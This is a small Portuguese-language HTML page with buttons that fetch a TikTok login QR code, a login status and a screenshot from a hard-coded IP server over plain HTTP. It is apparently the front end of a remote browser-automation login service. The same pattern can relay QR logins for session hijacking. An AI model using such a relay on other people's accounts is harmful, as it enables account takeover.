<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tiktok</title>
</head>

<body>
    <h1>Login TikTok</h1>

    <button onclick="startLogin()">Gerar QR Code</button>
    <br /><br />
    <img id="qrcode" />
    <br /> <br />
    <button onclick="checkStatus()">Verificar Status</button>
    <span id="status"></span>
    <br /> <br />
    <button onclick="tirarPrint()">Ver print</button>
    <img id="ver-print"></img>
    <br /> <br />

    <script>
        async function startLogin() {
            const res = await fetch('http://82.112.245.7:6080/tiktok/joao/login/qrcode', {
                method: "POST"
            });
            const data = await res.json();
            document.getElementById('qrcode').src = data.qrCode;
        }
       
        async function tirarPrint() {
            const res = await fetch('http://82.112.245.7:6080/tiktok/joao/print', {
                method: "GET"
            });
            const data = await res.json();
            document.getElementById('ver-print').src = data.qrCode;
        }

        async function checkStatus() {
            const res = await fetch('http://82.112.245.7:6080/tiktok/joao/login/status', {
                method: "GET"
            });
            const data = await res.json();
            document.getElementById('status').textContent = data.logged ? "Logado com sucesso" : "NÃ£o logado";
        }
    </script>
</body>

</html>
